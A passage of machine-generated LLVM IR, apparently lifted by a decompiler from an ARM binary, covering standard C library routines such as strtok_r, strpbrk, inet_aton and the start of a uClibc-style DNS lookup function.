.backedge.backedge:                               ; preds = %dec_label_pc_100ec, %dec_label_pc_10080
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1009c, 3
  br i1 %tmp70, label %dec_label_pc_10080, label %dec_label_pc_10108

bb19:                                             ; preds = %dec_label_pc_100ec
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 %v1_10080

dec_label_pc_1010c:                               ; preds = %dec_label_pc_10108
  %v1_10118 = add i32 %v0_10118, -1
  %v1_1010c = add i32 %v0_1010c, -1
  %v2_1010c = inttoptr i32 %v1_1010c to i8*
  %v3_1010c = load i8, i8* %v2_1010c, align 1
  %v4_1010c = zext i8 %v3_1010c to i32
  %v9_10110 = icmp eq i32 %v4_1010c, %v1_10048
  br i1 %v9_10110, label %bb20, label %dec_label_pc_10108

bb20:                                             ; preds = %dec_label_pc_1010c
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 %v1_1010c

dec_label_pc_10108:                               ; preds = %dec_label_pc_10074, %.backedge.backedge, %dec_label_pc_1010c
  %v0_1010c = phi i32 [ %v1_1010c, %dec_label_pc_1010c ], [ %v0_1010c11, %dec_label_pc_10074 ], [ %v1_10080, %.backedge.backedge ]
  %v0_10118 = phi i32 [ %v1_10118, %dec_label_pc_1010c ], [ %v0_100f87, %dec_label_pc_10074 ], [ %v1_1009c, %.backedge.backedge ]
  %v2_10118 = icmp eq i32 %v0_10118, 0
  br i1 %v2_10118, label %dec_label_pc_10120, label %dec_label_pc_1010c

dec_label_pc_10120:                               ; preds = %dec_label_pc_10108
  store i32 %v3_10044, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10118, { 1, 0 }
  uselistorder i32 %v1_1009c, { 1, 0, 2 }
  uselistorder i32 %v1_10080, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1008050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_10074, { 1, 0 }
  uselistorder i32 %v0_100f87, { 1, 2, 0 }
  uselistorder i32 %v0_10054, { 1, 0, 2 }
  uselistorder i32 %v1_10054, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1004c, { 1, 0 }
  uselistorder i32 %v1_10048, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_10044, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10108, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10080, { 1, 0 }
  uselistorder label %dec_label_pc_10074, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1006c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10130 = load i32, i32* @r4, align 4
  store i32 %v3_10130, i32* %stack_var_-16, align 4
  %v6_10130 = load i32, i32* @r5, align 4
  %v0_10134 = load i32, i32* @r0, align 4
  store i32 %v0_10134, i32* %r4.global-to-local, align 4
  %v2_10134 = icmp eq i32 %v0_10134, 0
  %v1_10138 = load i32, i32* @r2, align 4
  br i1 %v2_10134, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_10138 = inttoptr i32 %v1_10138 to i32*
  %v3_10138 = load i32, i32* %v2_10138, align 4
  store i32 %v3_10138, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1013c = phi i32 [ %v3_10138, %bb ], [ %v0_10134, %entry ]
  store i32 %v0_1013c, i32* @r0, align 4
  store i32 %v1_10138, i32* @r5, align 4
  %v0_10144 = load i32, i32* @r1, align 4
  store i32 %v0_10144, i32* %r6.global-to-local, align 4
  %v1_10148 = inttoptr i32 %v0_1013c to i8*
  %v2_10148 = call i32 @__GI_strspn(i8* %v1_10148)
  %v0_1014c = load i32, i32* %r4.global-to-local, align 4
  %v2_1014c = add i32 %v0_1014c, %v2_10148
  %v3_1014c = inttoptr i32 %v2_1014c to i8*
  %v4_1014c = load i8, i8* %v3_1014c, align 1
  %v6_1014c = zext i8 %v4_1014c to i32
  store i32 %v6_1014c, i32* %r3.global-to-local, align 4
  store i32 %v2_1014c, i32* @r4, align 4
  %v2_10154 = icmp eq i8 %v4_1014c, 0
  store i1 %v2_10154, i1* @cpsr_z, align 1
  %v0_10158 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10158, i32* @r1, align 4
  store i32 %v2_1014c, i32* @r0, align 4
  br i1 %v2_10154, label %bb7, label %dec_label_pc_10168

bb7:                                              ; preds = %entry._crit_edge
  %v2_10160 = load i32, i32* @r5, align 4
  %v3_10160 = inttoptr i32 %v2_10160 to i32*
  store i32 %v2_1014c, i32* %v3_10160, align 4
  br label %dec_label_pc_1019c

dec_label_pc_10168:                               ; preds = %entry._crit_edge
  %v0_10168 = call i32 @__GI_strpbrk()
  store i32 %v0_10168, i32* %r2.global-to-local, align 4
  %v3_1016c = icmp eq i32 %v0_10168, 0
  store i1 %v3_1016c, i1* @cpsr_z, align 1
  br i1 %v3_1016c, label %dec_label_pc_1017c, label %dec_label_pc_1018c

dec_label_pc_1017c:                               ; preds = %dec_label_pc_10168
  %v0_10174 = load i32, i32* @r4, align 4
  %v2_1017c = call i32 @rawmemchr(i32 %v0_10174, i32 0)
  %v0_10180 = load i32, i32* @r4, align 4
  store i32 %v0_10180, i32* %r3.global-to-local, align 4
  %v1_10184 = load i32, i32* @r5, align 4
  %v2_10184 = inttoptr i32 %v1_10184 to i32*
  store i32 %v2_1017c, i32* %v2_10184, align 4
  br label %dec_label_pc_1019c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_10168
  %v3_10190 = inttoptr i32 %v0_10168 to i8*
  store i8 0, i8* %v3_10190, align 1
  %v4_10190 = load i32, i32* %r2.global-to-local, align 4
  %v5_10190 = add i32 %v4_10190, 1
  store i32 %v5_10190, i32* %r2.global-to-local, align 4
  %v1_10194 = load i32, i32* @r5, align 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  store i32 %v5_10190, i32* %v2_10194, align 4
  %v0_10198 = load i32, i32* @r4, align 4
  store i32 %v0_10198, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %bb7, %dec_label_pc_1017c, %dec_label_pc_1018c
  %v0_1019c = load i32, i32* %r3.global-to-local, align 4
  %v2_101a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_101a0, i32* @r4, align 4
  store i32 %v6_10130, i32* @r5, align 4
  ret i32 %v0_1019c

; uselistorder directives
  uselistorder i32 %v0_1013c, { 1, 0 }
  uselistorder i32 %v0_10134, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1019c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_101a4 = load i32, i32* @r0, align 4
  %v1_101c82 = inttoptr i32 %v0_101a4 to i8*
  %v2_101c83 = load i8, i8* %v1_101c82, align 1
  %v3_101c84 = zext i8 %v2_101c83 to i32
  %v2_101cc5 = icmp eq i8 %v2_101c83, 0
  br i1 %v2_101cc5, label %dec_label_pc_101c8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_101d4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_101ac:                               ; preds = %dec_label_pc_101b4
  %v1_101bc = add i32 %v0_101bc, 1
  %v9_101ac = icmp eq i32 %v3_101b4, %v3_101c86
  br i1 %v9_101ac, label %dec_label_pc_101dc, label %dec_label_pc_101b4

dec_label_pc_101b4:                               ; preds = %dec_label_pc_101ac, %bb
  %v0_101bc = phi i32 [ %v1_101bc, %dec_label_pc_101ac ], [ %v0_101d4.pre, %bb ]
  %v1_101b4 = inttoptr i32 %v0_101bc to i8*
  %v2_101b4 = load i8, i8* %v1_101b4, align 1
  %v3_101b4 = zext i8 %v2_101b4 to i32
  store i32 %v3_101b4, i32* @ip, align 4
  %v2_101b8 = icmp eq i8 %v2_101b4, 0
  br i1 %v2_101b8, label %dec_label_pc_101c4, label %dec_label_pc_101ac

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101b4
  %v1_101c4 = add i32 %v0_101c4, 1
  %v1_101c8 = inttoptr i32 %v1_101c4 to i8*
  %v2_101c8 = load i8, i8* %v1_101c8, align 1
  %v3_101c8 = zext i8 %v2_101c8 to i32
  %v2_101cc = icmp eq i8 %v2_101c8, 0
  br i1 %v2_101cc, label %dec_label_pc_101c8._crit_edge, label %bb

dec_label_pc_101c8._crit_edge:                    ; preds = %dec_label_pc_101c4, %entry
  %v3_101c8.lcssa = phi i32 [ %v3_101c84, %entry ], [ %v3_101c8, %dec_label_pc_101c4 ]
  ret i32 %v3_101c8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_101c4
  %v0_101c4 = phi i32 [ %v0_101a4, %.lr.ph ], [ %v1_101c4, %dec_label_pc_101c4 ]
  %v3_101c86 = phi i32 [ %v3_101c84, %.lr.ph ], [ %v3_101c8, %dec_label_pc_101c4 ]
  br label %dec_label_pc_101b4

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101ac
  ret i32 %v0_101c4

; uselistorder directives
  uselistorder i32 %v3_101c8, { 1, 0 }
  uselistorder i32 %v3_101b4, { 1, 0 }
  uselistorder i32 %v0_101bc, { 1, 0 }
  uselistorder i32 %v3_101c84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_101b4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_101e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_101e4 = icmp eq i32 %v0_101e4, 0
  %v3_101e8 = load i32, i32* @r4, align 4
  store i32 %v3_101e8, i32* %stack_var_-20, align 4
  br i1 %v2_101e4, label %dec_label_pc_102c4, label %dec_label_pc_10200.lr.ph

dec_label_pc_10200:                               ; preds = %dec_label_pc_10200.lr.ph, %dec_label_pc_10284
  %v1_10284 = phi i32 [ 0, %dec_label_pc_10200.lr.ph ], [ %v5_10284, %dec_label_pc_10284 ]
  %v0_10288 = phi i32 [ 1, %dec_label_pc_10200.lr.ph ], [ %v1_10288, %dec_label_pc_10284 ]
  %v0_10208 = phi i32 [ %v0_101e4, %dec_label_pc_10200.lr.ph ], [ %v0_1020825, %dec_label_pc_10284 ]
  store i32 %v2_10204.pre, i32* @lr, align 4
  %v1_10208 = inttoptr i32 %v0_10208 to i8*
  %v2_10208 = load i8, i8* %v1_10208, align 1
  %v3_10208 = zext i8 %v2_10208 to i32
  %v3_1020c = mul nuw nsw i32 %v3_10208, 2
  %v4_1020c = add i32 %v3_1020c, %v2_10204.pre
  %v5_1020c = inttoptr i32 %v4_1020c to i8*
  %v6_1020c = load i8, i8* %v5_1020c, align 1
  %v1_10210 = and i8 %v6_1020c, 8
  %v2_10210 = icmp eq i8 %v1_10210, 0
  br i1 %v2_10210, label %dec_label_pc_102c4, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %dec_label_pc_10200
  br label %dec_label_pc_10238

dec_label_pc_10220:                               ; preds = %dec_label_pc_10238
  %v3_10224 = mul i32 %v0_10284, 10
  %v4_10224 = add i32 %v3_10238, %v3_10224
  %v1_10228 = add i32 %v4_10224, -48
  %v8_10230 = icmp sgt i32 %v1_10228, 255
  br i1 %v8_10230, label %dec_label_pc_102c4, label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_10220
  %v1_10234 = add i32 %v0_10274, 1
  store i32 %v1_10234, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10218, %dec_label_pc_10234
  %v0_10284 = phi i32 [ 0, %dec_label_pc_10218 ], [ %v1_10228, %dec_label_pc_10234 ]
  %v0_10274 = phi i32 [ %v0_10208, %dec_label_pc_10218 ], [ %v1_10234, %dec_label_pc_10234 ]
  %v1_10238 = inttoptr i32 %v0_10274 to i8*
  %v2_10238 = load i8, i8* %v1_10238, align 1
  %v3_10238 = zext i8 %v2_10238 to i32
  %v2_1023c = mul nuw nsw i32 %v3_10238, 2
  %v2_10240 = add i32 %v2_1023c, %v2_10204.pre
  %v3_10244 = inttoptr i32 %v2_10240 to i8*
  %v4_10244 = load i8, i8* %v3_10244, align 1
  %v6_10244 = zext i8 %v4_10244 to i32
  %v1_10250 = and i32 %v6_10244, 8
  %v2_10250 = icmp eq i32 %v1_10250, 0
  br i1 %v2_10250, label %dec_label_pc_10258, label %dec_label_pc_10220

dec_label_pc_10258:                               ; preds = %dec_label_pc_10238
  %v8_1025c = icmp sgt i32 %v0_10288, 3
  br i1 %v8_1025c, label %dec_label_pc_10270, label %dec_label_pc_10260

dec_label_pc_10260:                               ; preds = %dec_label_pc_10258
  %v7_10260 = icmp eq i8 %v2_10238, 46
  br i1 %v7_10260, label %dec_label_pc_10268, label %dec_label_pc_102c4

dec_label_pc_10268:                               ; preds = %dec_label_pc_10260
  %v1_10268 = add i32 %v0_10274, 1
  store i32 %v1_10268, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10284

dec_label_pc_10270:                               ; preds = %dec_label_pc_10258
  %v2_10270 = icmp eq i8 %v2_10238, 0
  %v1_10274 = add i32 %v0_10274, 1
  store i32 %v1_10274, i32* %r0.global-to-local, align 4
  br i1 %v2_10270, label %dec_label_pc_10284, label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10270
  %v1_1027c = and i32 %v6_10244, 32
  %v2_1027c = icmp eq i32 %v1_1027c, 0
  br i1 %v2_1027c, label %dec_label_pc_102c4, label %dec_label_pc_10284

dec_label_pc_10284:                               ; preds = %dec_label_pc_1027c, %dec_label_pc_10270, %dec_label_pc_10268
  %v0_1020825 = phi i32 [ %v1_10274, %dec_label_pc_1027c ], [ %v1_10274, %dec_label_pc_10270 ], [ %v1_10268, %dec_label_pc_10268 ]
  %v4_10284 = mul i32 %v1_10284, 256
  %v5_10284 = or i32 %v0_10284, %v4_10284
  %v1_10288 = add nuw nsw i32 %v0_10288, 1
  %v7_10290 = icmp slt i32 %v1_10288, 5
  br i1 %v7_10290, label %dec_label_pc_10200, label %dec_label_pc_10294

dec_label_pc_10200.lr.ph:                         ; preds = %entry
  %v2_10204.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %dec_label_pc_10200

dec_label_pc_10294:                               ; preds = %dec_label_pc_10284
  %v2_10294 = icmp eq i32 %arg2, 0
  br i1 %v2_10294, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_10294
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_10294
  %v3_102b0 = call i32 @llvm.bswap.i32(i32 %v5_10284)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_102bc = inttoptr i32 %arg2 to i32*
  store i32 %v3_102b0, i32* %v3_102bc, align 4
  %v2_102c0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_102c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_102c0 = phi i32 [ 1, %bb ], [ %v17_102c0.pre, %bb41 ]
  %v2_102c0 = phi i32 [ %v3_101e8, %bb ], [ %v2_102c0.pre, %bb41 ]
  store i32 %v2_102c0, i32* @r4, align 4
  ret i32 %v17_102c0

dec_label_pc_102c4:                               ; preds = %dec_label_pc_10260, %dec_label_pc_1027c, %dec_label_pc_10200, %dec_label_pc_10220, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_101e8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10204.pre, { 2, 1, 0 }
  uselistorder i32 %v1_10288, { 1, 0 }
  uselistorder i32 %v0_10274, { 0, 1, 3, 2 }
  uselistorder i32 %v3_101e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 8, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_102c4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_10238, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_102d0 = load i32, i32* @r4, align 4
  %v6_102d0 = load i32, i32* @r5, align 4
  %v9_102d0 = load i32, i32* @r6, align 4
  %v12_102d0 = load i32, i32* @r7, align 4
  %v15_102d0 = load i32, i32* @r8, align 4
  %v18_102d0 = load i32, i32* @sb, align 4
  %v21_102d0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_102f0 = call i32 @malloc(i32 512)
  store i32 %v1_102f0, i32* @r7, align 4
  %v1_102fc = call i32 @malloc(i32 1025)
  %v2_10300 = icmp eq i32 %v1_102fc, 0
  br i1 %v2_10300, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_10304 = load i32, i32* @r7, align 4
  %v3_10304 = icmp eq i32 %v1_10304, 0
  store i32 %v1_102fc, i32* %stack_var_-236, align 4
  br i1 %v3_10304, label %bb195, label %dec_label_pc_10318

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_109f8

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_109f8

dec_label_pc_10318:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1031c = icmp eq i32 %arg3, 0
  br i1 %v2_1031c, label %dec_label_pc_109f8, label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_10318
  %v2_10328 = load i8, i8* %arg1, align 1
  %v2_1032c = icmp eq i8 %v2_10328, 0
  br i1 %v2_1032c, label %dec_label_pc_109f8, label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_10324
  %v3_10338 = call i32 @strlen(i8* nonnull %arg1)
  %v2_10340 = add i32 %v3_10338, %tmp
  %v1_10344 = add i32 %v2_10340, -1
  %v2_10344 = inttoptr i32 %v1_10344 to i8*
  %v3_10344 = load i8, i8* %v2_10344, align 1
  %v2_10348 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10348, i32* @r4, align 4
  %v7_1034c = icmp eq i8 %v3_10344, 46
  %. = zext i1 %v7_1034c to i32
  store i32 %v2_10348, i32* @r0, align 4
  %v1_10370 = call i32 @__pthread_return_void()
  %v1_10380 = call i32 @__pthread_return_0()
  %v2_1038c = load i32, i32* @global_var_1fe48.685, align 4
  %v2_10390 = srem i32 %v2_1038c, %arg3
  %v3_10398 = load i8, i8* @global_var_1d7b1.688, align 1
  %v4_10398 = zext i8 %v3_10398 to i32
  %v2_1039c = load i8, i8* bitcast (i8** @global_var_1d7b0.687 to i8*), align 4
  %v3_1039c = zext i8 %v2_1039c to i32
  %v4_103a4 = mul nuw nsw i32 %v4_10398, 256
  %v5_103a4 = or i32 %v3_1039c, %v4_103a4
  store i32 %v5_103a4, i32* @sb, align 4
  store i32 %v2_10390, i32* @sl, align 4
  store i32 %v2_10348, i32* @r0, align 4
  %v1_103b8 = call i32 @__pthread_return_void()
  %v0_103c4 = load i32, i32* @r5, align 4
  %v2_103e4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_10428 = bitcast i8* %stack_var_-188 to i32*
  %v2_10508 = ptrtoint i32* %stack_var_-92 to i32
  %v3_105a0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_10604 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_10950 = icmp eq i1 %v7_1034c, false
  %v7_10658 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1073c = ptrtoint i32* %stack_var_-140 to i32
  %v9_10834 = icmp eq i32 %tmp147, %arg2
  %v7_107c8 = icmp eq i32 %arg2, 1
  %v2_10770 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_103c4, 3
  br i1 %tmp292, label %dec_label_pc_103cc.lr.ph.preheader.lr.ph, label %dec_label_pc_10a04

dec_label_pc_103cc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_10334
  %v2_106dc = icmp eq i32 %tmp156, 0
  %v8_107cc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_103cc.lr.ph.preheader

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103cc.lr.ph, %dec_label_pc_109e8.backedge
  %v1_103d4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_103cc.lr.ph ], [ %v0_1057c, %dec_label_pc_109e8.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_103cc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_109e8.backedge ]
  %v7_103d0 = icmp eq i32 %v1_103d4, -1
  br i1 %v7_103d0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_103cc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_103cc, %bb199
  %v1_103d8 = xor i1 %v7_103d0, true
  call void @__pseudo_cond_branch(i1 %v1_103d8, i32 ptrtoint (i32* @global_var_a9f4.690 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_103e4, i32* @r4, align 4
  %v0_103e8 = load i32, i32* @r7, align 4
  %v2_103ec = inttoptr i32 %v0_103e8 to i8*
  %v3_103ec = call i32 @__GI_memset(i8* %v2_103ec, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_103fc = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_10400 = load i32, i32* @sb, align 4
  %v1_10400 = add i32 %v0_10400, 1
  %v3_10408 = urem i32 %v1_10400, 65536
  store i32 %v3_10408, i32* @sb, align 4
  %v0_10414 = load i32, i32* @r7, align 4
  %v5_10420 = trunc i32 %v1_10400 to i8
  store i8 %v5_10420, i8* %stack_var_-188, align 1
  %v7_10428 = call i32 @__encode_header(i32* %v6_10428, i32 %v0_10414, i32 512, i32 1, i32 %v1_10400)
  store i32 %v7_10428, i32* @r5, align 4
  %v1_1042c = icmp slt i32 %v7_10428, 0
  br i1 %v1_1042c, label %dec_label_pc_10a04, label %dec_label_pc_10434

dec_label_pc_10434:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_1043c = load i32, i32* %stack_var_-236, align 4
  %v4_10440 = call i32 @strncpy(i32 %v2_1043c, i32 %tmp, i32 1025)
  store i32 %v2_10348, i32* @r0, align 4
  %v1_10458 = call i32 @__pthread_return_void()
  %v1_10468 = call i32 @__pthread_return_0()
  %v1_10478 = load i32, i32* @sl, align 4
  %v4_10478 = mul i32 %v1_10478, 4
  %v5_10478 = add i32 %v4_10478, %arg4
  %v6_10478 = inttoptr i32 %v5_10478 to i32*
  %v7_10478 = load i32, i32* %v6_10478, align 4
  store i32 %v7_10478, i32* @r6, align 4
  br i1 %v1_10474, label %dec_label_pc_104bc, label %dec_label_pc_10480

dec_label_pc_10480:                               ; preds = %dec_label_pc_10434
  %v2_10488 = load i32, i32* @global_var_1feb0.693, align 4
  %v6_10490 = icmp slt i32 %v6_109ac, %v2_10488
  br i1 %v6_10490, label %dec_label_pc_10494, label %dec_label_pc_104bc

dec_label_pc_10494:                               ; preds = %dec_label_pc_10480
  store i32 ptrtoint (i32* @global_var_149c8.695 to i32), i32* @r1, align 4
  %v2_1049c = load i32, i32* %stack_var_-236, align 4
  %v4_104a0 = inttoptr i32 %v2_1049c to i8*
  %v5_104a0 = call i32 @__GI_strncat(i8* %v4_104a0, i32 ptrtoint (i32* @global_var_149c8.695 to i32), i32 1025, i32 %v2_10488)
  %v7_104b0 = load i32, i32* %v6_104b0, align 4
  store i32 %v7_104b0, i32* @r1, align 4
  %v4_104b8 = inttoptr i32 %v2_1049c to i8*
  %v5_104b8 = call i32 @__GI_strncat(i8* %v4_104b8, i32 %v7_104b0, i32 1025, i32 ptrtoint (i32* @global_var_1fe90.697 to i32))
  br label %dec_label_pc_104bc

dec_label_pc_104bc:                               ; preds = %dec_label_pc_10480, %dec_label_pc_10434, %dec_label_pc_10494
  store i32 %v2_10348, i32* @r0, align 4
  store i32 66768, i32* @lr, align 4
  %v1_104cc = call i32 @__pthread_return_void()
  %v2_104d8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_104d8, i32* %stack_var_-56, align 4
  %v0_104e8 = load i32, i32* @r7, align 4
  %v1_104e8 = load i32, i32* @r5, align 4
  %v2_104e8 = add i32 %v1_104e8, %v0_104e8
  %v1_104ec = sub i32 512, %v1_104e8
  %v8_104f4 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_104e8, i32 %v1_104ec, i32 %arg2, i32 %v2_104d8, i32 %arg2, i32 1)
  store i32 %v8_104f4, i32* @fp, align 4
  %v1_104f8 = icmp slt i32 %v8_104f4, 0
  br i1 %v1_104f8, label %dec_label_pc_10a04, label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %dec_label_pc_104bc
  store i32 0, i32* @r4, align 4
  %v0_10510 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1051c = inttoptr i32 %v0_10510 to i8*
  %v4_1051c = call i32 @inet_pton(i32 10, i8* %v3_1051c, i32 %v2_10508)
  %v1_10520 = load i32, i32* @r4, align 4
  %v7_10524 = icmp sgt i32 %v4_1051c, %v1_10520
  br i1 %v7_10524, label %bb201, label %dec_label_pc_10500..thread11_crit_edge

dec_label_pc_10500..thread11_crit_edge:           ; preds = %dec_label_pc_10500
  %v3_10530.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_10500
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10500..thread11_crit_edge, %bb201
  %v3_10530 = phi i8 [ %v3_10530.pre, %dec_label_pc_10500..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_10530 = sext i8 %v3_10530 to i32
  %v8_1052c.op = urem i32 %v1_10520, 256
  %v8_1052c.op.op = mul nuw nsw i32 %v8_1052c.op, 256
  %v4_10538 = select i1 %v7_10524, i32 %v8_1052c.op.op, i32 0
  %v5_10538 = or i32 %v4_10530, %v4_10538
  %v7_1053c = icmp eq i32 %v5_10538, 10
  br i1 %v7_1053c, label %dec_label_pc_10568, label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %.thread11
  %v0_10554 = load i32, i32* @r6, align 4
  store i32 %v0_10554, i32* @r0, align 4
  %v1_10560 = call i32 @inet_addr(i32 %v0_10554)
  br label %dec_label_pc_10568

dec_label_pc_10568:                               ; preds = %.thread11, %dec_label_pc_10550
  %v0_1057c = call i32 @socket()
  %v1_10580 = icmp slt i32 %v0_1057c, 0
  br i1 %v1_10580, label %.thread, label %dec_label_pc_10598

.thread:                                          ; preds = %dec_label_pc_10568
  br label %dec_label_pc_109e8.backedge

dec_label_pc_109e8.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_103cc, label %dec_label_pc_10a04

dec_label_pc_10598:                               ; preds = %dec_label_pc_10568
  %v4_105a0 = call i32 @__libc_connect(i32 %v0_1057c, %sockaddr* nonnull %v3_105a0, i32 28)
  %v1_105a4 = icmp slt i32 %v4_105a0, 0
  br i1 %v1_105a4, label %dec_label_pc_105ac, label %dec_label_pc_105cc

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10598
  %v0_105ac = call i32 @__errno_location()
  %v1_105b0 = inttoptr i32 %v0_105ac to i32*
  %v2_105b0 = load i32, i32* %v1_105b0, align 4
  %v7_105b4 = icmp eq i32 %v2_105b0, 101
  br i1 %v7_105b4, label %dec_label_pc_10918, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_105ac
  br label %dec_label_pc_109e8.backedge

dec_label_pc_105cc:                               ; preds = %dec_label_pc_10598
  %v0_105cc = load i32, i32* @r5, align 4
  %v1_105cc = load i32, i32* @fp, align 4
  %v2_105cc = add i32 %v1_105cc, %v0_105cc
  %v0_105d0 = load i32, i32* @r7, align 4
  %v4_105dc = inttoptr i32 %v0_105d0 to i32*
